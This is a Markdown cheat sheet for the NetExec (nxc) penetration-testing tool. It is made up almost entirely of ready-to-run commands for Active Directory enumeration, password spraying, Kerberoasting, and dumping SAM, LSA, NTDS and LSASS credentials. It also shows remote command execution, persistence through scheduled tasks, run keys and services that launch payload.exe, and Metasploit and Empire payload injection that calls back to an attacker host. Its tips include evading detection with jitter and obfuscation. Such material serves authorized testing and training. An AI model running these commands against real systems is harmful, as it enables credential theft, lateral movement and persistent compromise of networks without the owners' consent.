---
title: "NetExec (nxc)"
description: "NetExec/CrackMapExec successor: SMB/WinRM/LDAP/MSSQL sweeps, cred spraying, dumping and modules."
category: active-directory
tags: [active-directory, smb, credentials, enumeration]
tools: [NetExec, nxc]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:Tools/Netexec (nxc) Cheat Sheet.md"
---

# NetExec (nxc)

NetExec is the maintained successor to CrackMapExec. The binary is `nxc` (or the full name `netexec`).

## Installation & Updates

```bash
# Install via pipx (recommended)
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec

# Upgrade to latest version
pipx upgrade netexec

# Check version
nxc --version
netexec --version
```

## General Syntax

```bash
# Basic command structure
nxc <protocol> <target> [options]
netexec <protocol> <target> [options]  # Full name works too

# Target formats
nxc <protocol> 192.168.1.10           # Single IP
nxc <protocol> 192.168.1.0/24         # CIDR range
nxc <protocol> 192.168.1.1-50         # IP range
nxc <protocol> targets.txt            # File with targets

# Common options
-u USERNAME                            # Username (or file)
-p PASSWORD                            # Password (or file)
-H HASH                                # NTLM hash
-d DOMAIN                              # Domain name
-k                                     # Use Kerberos
--local-auth                           # Local authentication
--continue-on-success                  # Keep testing after success
-t THREADS                             # Number of threads
-M MODULE                              # Use module
-x COMMAND                             # Execute CMD command
-X PS_COMMAND                          # Execute PowerShell command
```

## DNS Configuration Options

```bash
# Specify DNS server (CRITICAL for LDAP/BloodHound)
nxc <protocol> <target> --dns-server <dns-ip>

# Use TCP for DNS resolution
nxc <protocol> <target> --dns-tcp

# Set DNS timeout
nxc <protocol> <target> --dns-timeout 10

# Force IPv6
nxc <protocol> <target> -6

# Combined example
nxc ldap dc.domain.local --dns-server 10.10.10.10 --dns-tcp --dns-timeout 15
```

## Authentication Methods

```bash
# Username and password
nxc smb 192.168.1.10 -u administrator -p 'Password123!'

# Null session
nxc smb 192.168.1.10 -u '' -p ''

# Guest authentication
nxc smb 192.168.1.10 -u 'guest' -p ''

# Pass-the-Hash (NTLM)
nxc smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
nxc smb 192.168.1.10 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Local authentication (bypass domain)
nxc smb 192.168.1.10 -u administrator -p password --local-auth

# Kerberos authentication
nxc smb dc.domain.local -u username -p password -k
nxc ldap dc.domain.local --use-kcache

# Credential files
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt
nxc smb 192.168.1.0/24 -u users.txt -H hashes.txt
```

## SMB Protocol

### Basic Enumeration

```bash
# Scan for SMB hosts
nxc smb 192.168.1.0/24

# Check SMB signing (for relay attacks)
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt

# Enumerate shares
nxc smb 192.168.1.10 -u username -p password --shares
nxc smb 192.168.1.10 -u '' -p '' --shares  # Null session

# Enumerate domain users
nxc smb 192.168.1.10 -u username -p password --users

# Enumerate domain groups
nxc smb 192.168.1.10 -u username -p password --groups

# Enumerate local groups
nxc smb 192.168.1.10 -u username -p password --local-groups

# Enumerate logged on users
nxc smb 192.168.1.10 -u username -p password --loggedon-users

# Enumerate active sessions
nxc smb 192.168.1.10 -u username -p password --sessions

# RID brute force
nxc smb 192.168.1.10 -u username -p password --rid-brute
nxc smb 192.168.1.10 -u '' -p '' --rid-brute  # Anonymous

# Password policy
nxc smb 192.168.1.10 -u username -p password --pass-pol

# All-in-one enumeration
nxc smb 192.168.1.10 -u username -p password --shares --users --groups --local-groups --loggedon-users --sessions --pass-pol --rid-brute

# Export username list
nxc <protocol> <target> -u username -p password --users --users-export users.txt
```

### Command Execution

```bash
# Execute CMD command (lowercase -x)
nxc smb 192.168.1.10 -u administrator -p password -x "whoami"
nxc smb 192.168.1.10 -u administrator -p password -x "ipconfig /all"

# Execute PowerShell command (uppercase -X)
nxc smb 192.168.1.10 -u administrator -p password -X '$PSVersionTable'
nxc smb 192.168.1.10 -u administrator -p password -X 'Get-Process'

# Execute with Pass-the-Hash
nxc smb 192.168.1.10 -u administrator -H <NTLM_HASH> -x "hostname"

# Specify execution method
nxc smb 192.168.1.10 -u administrator -p password -x "whoami" --exec-method wmiexec
nxc smb 192.168.1.10 -u administrator -p password -x "whoami" --exec-method atexec
nxc smb 192.168.1.10 -u administrator -p password -x "whoami" --exec-method smbexec
nxc smb 192.168.1.10 -u administrator -p password -x "whoami" --exec-method mmcexec

# Execute without retrieving output
nxc smb 192.168.1.10 -u administrator -p password -x "command" --no-output
```

### File Operations

```bash
# Download file from target
nxc smb 192.168.1.10 -u administrator -p password --get-file "\\Windows\\System32\\config\\SAM" ./SAM

# Upload file to target
nxc smb 192.168.1.10 -u administrator -p password --put-file ./payload.exe "\\Windows\\Temp\\payload.exe"

# Specify share for file operations
nxc smb 192.168.1.10 -u administrator -p password --get-file target_file output_file --share C$
```

### Credential Dumping

```bash
# Dump SAM database
nxc smb 192.168.1.10 -u administrator -p password --sam

# Dump LSA secrets
nxc smb 192.168.1.10 -u administrator -p password --lsa

# Dump NTDS.dit (Domain Controller)
nxc smb 192.168.1.10 -u administrator -p password --ntds
nxc smb 192.168.1.10 -u administrator -p password --ntds vss       # VSS method
nxc smb 192.168.1.10 -u administrator -p password --ntds drsuapi   # DRSUAPI method

# Dump specific user from NTDS
nxc smb 192.168.1.10 -u administrator -p password --ntds --user targetuser

# Dump DPAPI credentials
nxc smb 192.168.1.10 -u administrator -p password --dpapi
nxc smb 192.168.1.10 -u administrator -p password --dpapi cookies
nxc smb 192.168.1.10 -u administrator -p password --dpapi nosystem

# Dump LSASS (using lsassy module)
nxc smb 192.168.1.10 -u administrator -p password -M lsassy

# Dump LAPS passwords
nxc smb 192.168.1.10 -u username -p password --laps

# Chain multiple dumps
nxc smb 192.168.1.10 -u administrator -p password --sam --lsa --dpapi
```

### Password Spraying

```bash
# Single password against multiple users
nxc smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Multiple passwords against multiple users
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# No bruteforce mode (pair user1:pass1, user2:pass2)
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Password spray with delay
nxc smb 192.168.1.0/24 -u users.txt -p password --continue-on-success --jitter 5

# Local admin spray
nxc smb 192.168.1.0/24 -u administrator -p passwords.txt --local-auth --continue-on-success
```

### SMB Modules

```bash
# List available SMB modules
nxc smb -L
nxc smb --list-modules

# Show module info / options
nxc smb -M lsassy --module-info
nxc smb -M module_name --options

# Enumerate AV products
nxc smb 192.168.1.10 -u administrator -p password -M enum_av

# GPP password extraction
nxc smb 192.168.1.10 -u username -p password -M gpp_password

# Enable RDP
nxc smb 192.168.1.10 -u administrator -p password -M rdp -o ACTION=enable

# WiFi password extraction
nxc smb 192.168.1.10 -u administrator -p password -M wifi

# Check for vulnerabilities
nxc smb 192.168.1.10 -M zerologon
nxc smb 192.168.1.10 -u username -p password -M petitpotam
nxc smb 192.168.1.10 -u username -p password -M nopac
nxc smb 192.168.1.10 -u username -p password -M printnightmare

# Coerce vulnerabilities check
nxc smb 192.168.1.10 -u username -p password -M coerce_plus -o LISTENER=192.168.1.5

# NTDS extraction module
nxc smb 192.168.1.10 -u administrator -p password -M ntdsutil

# Backup operator exploit
nxc smb 192.168.1.10 -u username -p password -M backup_operator

# Token impersonation
nxc smb 192.168.1.10 -u administrator -p password -M impersonate

# Change/reset password
nxc smb 192.168.1.10 -u administrator -p password -M change-password -o USER=targetuser NEWPASS=NewPass123!

# Retrieve MSOL password
nxc smb 192.168.1.10 -u administrator -p password -M msol

# Slinky (UNC path injection)
nxc smb 192.168.1.10 -u username -p password -M slinky -o SERVER=attacker-ip
```

## LDAP Protocol

### Basic Enumeration

```bash
# Basic LDAP authentication check
nxc ldap 192.168.1.10 -u username -p password
nxc ldap dc.domain.local -d domain.local -u username -p password

# Anonymous bind
nxc ldap 192.168.1.10 -u '' -p ''

# Get domain SID
nxc ldap 192.168.1.10 -u username -p password --get-sid

# Enumerate users / groups / computers
nxc ldap 192.168.1.10 -u username -p password --users
nxc ldap 192.168.1.10 -u username -p password --groups
nxc ldap 192.168.1.10 -u username -p password --computers

# Admin count users
nxc ldap 192.168.1.10 -u username -p password --admin-count

# Users with password not required
nxc ldap 192.168.1.10 -u username -p password --password-not-required

# Trusted for delegation
nxc ldap 192.168.1.10 -u username -p password --trusted-for-delegation

# Find delegation misconfigurations
nxc ldap 192.168.1.10 -u username -p password --find-delegation

# Password policy
nxc ldap 192.168.1.10 -u username -p password --pass-pol

# All-in-one LDAP enumeration
nxc ldap 192.168.1.10 -u username -p password --users --groups --admin-count --trusted-for-delegation --password-not-required
```

### ASREPRoasting

```bash
# ASREPRoast all vulnerable users
nxc ldap 192.168.1.10 -u username -p password --asreproast asrep_hashes.txt

# ASREPRoast specific user
nxc ldap 192.168.1.10 -u username -p password --asreproast asrep.txt --user targetuser
```

### Kerberoasting

```bash
# Kerberoast all SPNs
nxc ldap 192.168.1.10 -u username -p password --kerberoasting kerberoast_hashes.txt

# Kerberoast with specific encryption
nxc ldap 192.168.1.10 -u username -p password --kerberoasting kerberoast.txt --kerberoast-encryption rc4
nxc ldap 192.168.1.10 -u username -p password --kerberoasting kerberoast.txt --kerberoast-encryption aes256
```

### BloodHound Data Collection

```bash
# Full BloodHound collection (ALWAYS specify DNS server)
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection All --dns-server 192.168.1.10

# With domain specified
nxc ldap 192.168.1.10 -d domain.local -u username -p password --bloodhound --collection All --dns-server 192.168.1.10

# Use DNS over TCP (for unstable connections)
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection All --dns-server 192.168.1.10 --dns-tcp

# With DNS timeout
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection All --dns-server 192.168.1.10 --dns-timeout 15

# Specific collection methods
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection DCOnly --dns-server 192.168.1.10
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection Default --dns-server 192.168.1.10
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection Group --dns-server 192.168.1.10
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection LocalAdmin --dns-server 192.168.1.10
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection Session --dns-server 192.168.1.10
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection Trusts --dns-server 192.168.1.10
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection ACL --dns-server 192.168.1.10
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection Container --dns-server 192.168.1.10
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection ObjectProps --dns-server 192.168.1.10

# Multiple collection methods
nxc ldap 192.168.1.10 -u username -p password --bloodhound --collection Group,Session,ACL --dns-server 192.168.1.10

# Over proxy (use hostname not IP)
proxychains -q nxc ldap dc.domain.local -d domain.local -u username -p password --bloodhound --collection All --dns-server 192.168.1.10 --dns-tcp
```

### gMSA Passwords

```bash
# Enumerate gMSA accounts
nxc ldap 192.168.1.10 -u username -p password --gmsa

# Convert gMSA ID
nxc ldap 192.168.1.10 -u username -p password --gmsa-convert-id <ID>

# Decrypt gMSA from LSA
nxc ldap 192.168.1.10 -u username -p password --gmsa-decrypt-lsa gmsa_account
```

### LDAP Modules

```bash
# List LDAP modules
nxc ldap -L

# LDAP signing check
nxc ldap 192.168.1.10 -u username -p password -M ldap-checker

# ADCS enumeration
nxc ldap 192.168.1.10 -u username -p password -M adcs

# Machine Account Quota
nxc ldap 192.168.1.10 -u username -p password -M maq

# Pre-2000 computers
nxc ldap 192.168.1.10 -u username -p password -M pre2k

# LAPS passwords (LDAP module)
nxc ldap 192.168.1.10 -u username -p password -M laps

# Get network information
nxc ldap 192.168.1.10 -u username -p password -M get-network

# Whoami via LDAP
nxc ldap 192.168.1.10 -u username -p password -M whoami

# Teams local DB
nxc ldap 192.168.1.10 -u username -p password -M teams_localdb
```

### LDAP Queries

```bash
# Custom LDAP query
nxc ldap 192.168.1.10 -u username -p password --query "(objectClass=user)" --attributes samaccountname,mail

# Query with base DN
nxc ldap 192.168.1.10 -u username -p password --query "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)" --base-dn "DC=domain,DC=local"

# Query specific attributes
nxc ldap 192.168.1.10 -u username -p password --query "(name=Administrator)" --attributes objectSid,pwdLastSet
```

## WMI Protocol

```bash
# WMI authentication
nxc wmi 192.168.1.10 -u administrator -p password
nxc wmi 192.168.1.10 -u administrator -H <NTLM_HASH>

# Execute command via WMI
nxc wmi 192.168.1.10 -u administrator -p password -x "whoami"
nxc wmi 192.168.1.10 -u administrator -p password -X 'Get-Process'

# Custom WMI queries
nxc wmi 192.168.1.10 -u administrator -p password --wmi "SELECT * FROM Win32_OperatingSystem"
nxc wmi 192.168.1.10 -u administrator -p password --wmi "SELECT * FROM Win32_Process"
nxc wmi 192.168.1.10 -u administrator -p password --wmi "SELECT * FROM Win32_Service"
nxc wmi 192.168.1.10 -u administrator -p password --wmi "SELECT * FROM Win32_LoggedOnUser"
```

## WinRM Protocol

```bash
# WinRM authentication
nxc winrm 192.168.1.10 -u administrator -p password
nxc winrm 192.168.1.10 -u administrator -H <NTLM_HASH>

# WinRM over SSL / custom port
nxc winrm 192.168.1.10 -u administrator -p password --ssl
nxc winrm 192.168.1.10:5986 -u administrator -p password --ssl

# Execute command / PowerShell
nxc winrm 192.168.1.10 -u administrator -p password -x "whoami"
nxc winrm 192.168.1.10 -u administrator -p password -X 'Get-Process'

# Obfuscate PowerShell / no output
nxc winrm 192.168.1.10 -u administrator -p password -X 'Get-Process' --obfs
nxc winrm 192.168.1.10 -u administrator -p password -x "command" --no-output

# Dump SAM / LSA via WinRM
nxc winrm 192.168.1.10 -u administrator -p password --sam --lsa
```

## MSSQL Protocol

```bash
# SQL / Windows / local authentication
nxc mssql 192.168.1.10 -u sa -p password
nxc mssql 192.168.1.10 -u username -p password -d DOMAIN
nxc mssql 192.168.1.10 -u username -p password --local-auth
nxc mssql 192.168.1.10 -u username -H <NTLM_HASH>
nxc mssql 192.168.1.10:1434 -u sa -p password

# Execute SQL query
nxc mssql 192.168.1.10 -u sa -p password -q "SELECT @@version"
nxc mssql 192.168.1.10 -u sa -p password -q "SELECT name FROM sys.databases"
nxc mssql 192.168.1.10 -u sa -p password -q "EXEC sp_databases"
nxc mssql 192.168.1.10 -u sa -p password -q "SELECT * FROM information_schema.tables"
nxc mssql 192.168.1.10 -u sa -p password -q "SELECT IS_SRVROLEMEMBER('sysadmin')"
nxc mssql 192.168.1.10 -u sa -p password -q "EXEC sp_linkedservers"
nxc mssql 192.168.1.10 -u sa -p password -q "SELECT * FROM sys.server_principals"

# Execute OS command (xp_cmdshell) / PowerShell
nxc mssql 192.168.1.10 -u sa -p password -x "whoami"
nxc mssql 192.168.1.10 -u sa -p password -X 'Get-Process'

# Enumeration
nxc mssql 192.168.1.10 -u username -p password --enum-instances
nxc mssql 192.168.1.10 -u username -p password --rid-brute

# MSSQL modules
nxc mssql -L
nxc mssql 192.168.1.10 -u sa -p password -M enable_cmdshell -o ACTION=enable
nxc mssql 192.168.1.10 -u username -p password -M mssql_priv
nxc mssql 192.168.1.10 -u sa -p password -M enum_links
nxc mssql 192.168.1.10 -u sa -p password -M exec_on_link -o LINK=linkedserver QUERY="SELECT @@version"

# File operations
nxc mssql 192.168.1.10 -u sa -p password --get-file target_file output_file
nxc mssql 192.168.1.10 -u sa -p password --put-file local_file remote_file
```

## RDP Protocol

```bash
# Check RDP access / scan subnet
nxc rdp 192.168.1.10 -u administrator -p password
nxc rdp 192.168.1.0/24
nxc rdp 192.168.1.10 -u administrator -H <NTLM_HASH>
nxc rdp 192.168.1.10:3390 -u administrator -p password

# Screenshots
nxc rdp 192.168.1.10 -u administrator -p password --screenshot
nxc rdp 192.168.1.10 -u administrator -p password --screenshot --screentime 10
nxc rdp 192.168.1.10 -u administrator -p password --nla-screenshot

# Command execution (beta) with delays for slow targets
nxc rdp 192.168.1.10 -u administrator -p password -x "whoami"
nxc rdp 192.168.1.10 -u administrator -p password -x "whoami" --cmd-delay 2 --clipboard-delay 2

# Enumerate sessions
nxc rdp 192.168.1.10 -u administrator -p password --sessions
```

## SSH Protocol

```bash
# Password / key authentication
nxc ssh 192.168.1.10 -u root -p password
nxc ssh 192.168.1.10 -u root --key-file /path/to/id_rsa
nxc ssh 192.168.1.10:2222 -u root -p password

# Execute command
nxc ssh 192.168.1.10 -u root -p password -x "id && pwd && hostname"

# Test credentials across subnet
nxc ssh 192.168.1.0/24 -u root -p passwords.txt --continue-on-success
nxc ssh 192.168.1.0/24 -u users.txt -p password --continue-on-success
```

## FTP Protocol

```bash
# Authentication
nxc ftp 192.168.1.10 -u ftpuser -p password
nxc ftp 192.168.1.10 -u anonymous -p ''
nxc ftp 192.168.1.10:2121 -u ftpuser -p password

# File operations
nxc ftp 192.168.1.10 -u ftpuser -p password --ls
nxc ftp 192.168.1.10 -u ftpuser -p password --ls /path/to/directory
nxc ftp 192.168.1.10 -u ftpuser -p password --get /remote/file.txt
nxc ftp 192.168.1.10 -u ftpuser -p password --put /local/file.txt /remote/path/

# Scan for anonymous FTP
nxc ftp 192.168.1.0/24 -u anonymous -p '' --ls
```

## NFS Protocol

```bash
# Scan / list exports & shares
nxc nfs 192.168.1.10
nxc nfs 192.168.1.10 --exports
nxc nfs 192.168.1.10 --shares
nxc nfs 192.168.1.0/24 --shares

# Mount / list share contents
nxc nfs 192.168.1.10 --mount /export/path
nxc nfs 192.168.1.10 --ls /export/path
```

## VNC Protocol

```bash
# Password authentication / spray
nxc vnc 192.168.1.10 --vnc-password vncpass123
nxc vnc 192.168.1.10 --vnc-password passwords.txt
nxc vnc 192.168.1.10:5901 --vnc-password password

# Scan for VNC servers
nxc vnc 192.168.1.0/24
nxc vnc 192.168.1.0/24 --vnc-password common-vnc-passwords.txt
```

## Database Management

```bash
# Workspaces
nxc smb --show-workspace
nxc smb --list-workspaces
nxc smb --create-workspace workspace_name
nxc smb --set-workspace workspace_name

# Databases
nxc smb --list-databases
nxc smb --export-db /path/to/export.db
nxc smb --import-db /path/to/import.db
nxc smb --query "SELECT * FROM hosts"
nxc smb --query "SELECT * FROM credentials"
nxc smb --clear-database

# Enter interactive database mode
nxcdb
```

## Post-Exploitation & Persistence

```bash
# Enable RDP
nxc smb 192.168.1.10 -u administrator -p password -M rdp -o ACTION=enable

# Scheduled task persistence
nxc smb 192.168.1.10 -u administrator -p password -x 'schtasks /create /sc minute /mo 1 /tn "Update" /tr C:\\Windows\\Temp\\payload.exe'

# Registry run key persistence
nxc smb 192.168.1.10 -u administrator -p password -x 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\Windows\\Temp\\payload.exe'

# Create Windows service
nxc smb 192.168.1.10 -u administrator -p password -x 'sc create UpdateService binPath= "C:\\Windows\\Temp\\payload.exe" start= auto'

# Startup folder persistence
nxc smb 192.168.1.10 -u administrator -p password --put-file payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"
```

## Integration with Other Tools

```bash
# PowerShell Empire integration
nxc smb 192.168.1.10 -u administrator -p password -M empire_exec -o LISTENER=http
nxc mssql 192.168.1.10 -u sa -p password -M empire_exec -o LISTENER=listener_name

# Metasploit integration
nxc smb 192.168.1.10 -u administrator -p password -M met_inject -o LHOST=192.168.1.5 LPORT=4444
nxc mssql 192.168.1.10 -u sa -p password --local-auth -M met_inject -o LHOST=192.168.1.5 LPORT=4444
```

## Advanced Options

```bash
# Threads / timeout / jitter
nxc smb 192.168.1.0/24 -u administrator -p password -t 100
nxc smb 192.168.1.10 -u administrator -p password --timeout 30
nxc smb 192.168.1.0/24 -u username -p password --jitter 10

# Interface / DC IP
nxc smb 192.168.1.10 -u username -p password --interface eth1
nxc smb 192.168.1.10 -u username -p password --dc-ip 192.168.1.5

# Debug / verbose
nxc smb 192.168.1.10 -u username -p password --debug
nxc smb 192.168.1.10 -u username -p password --verbose

# Use proxychains
proxychains -q nxc smb 192.168.1.10 -u username -p password

# Generate helper files
nxc smb 192.168.1.0/24 --generate-hosts-file hosts.txt
nxc smb 192.168.1.10 -u username -p password --generate-krb5-file krb5.conf
```

## Useful Command Combinations

```bash
# Full domain enumeration
nxc smb 192.168.1.0/24 -u username -p password --shares --users --groups --loggedon-users --sessions --pass-pol

# Comprehensive credential dump
nxc smb 192.168.1.10 -u administrator -p password --sam --lsa --ntds --dpapi

# Password spray across subnet
nxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success --jitter 5

# Lateral movement check (PtH)
nxc smb 192.168.1.0/24 -u administrator -H <NTLM_HASH> -x "hostname"

# BloodHound collection with proper DNS
nxc ldap dc.domain.local -d domain.local -u username -p password --bloodhound --collection All --dns-server 192.168.1.10 --dns-tcp

# Find local admin access
nxc smb 192.168.1.0/24 -u username -p password --local-auth

# Execute across multiple protocols
nxc smb 192.168.1.10 -u administrator -p password -x "whoami"
nxc winrm 192.168.1.10 -u administrator -p password -x "whoami"
nxc wmi 192.168.1.10 -u administrator -p password -x "whoami"
```

## Tips & Best Practices

- Always use `--dns-server` with LDAP BloodHound collection.
- Use `--dns-tcp` for unreliable connections or proxies.
- Add `--continue-on-success` for password spraying.
- Use `--no-bruteforce` to match user:pass pairs.
- Leverage `--local-auth` to test local admin reuse.
- Add `--jitter` to avoid detection during sprays.
- Use `-t` to adjust threads based on network stability.
- Combine credential dumps: `--sam --lsa --ntds`.
- Use `--obfs` to obfuscate PowerShell execution.
- Test multiple execution methods (`--exec-method`) if one fails.
- Export findings with the database management features.
- Use modules (`-M`) for specialized tasks.
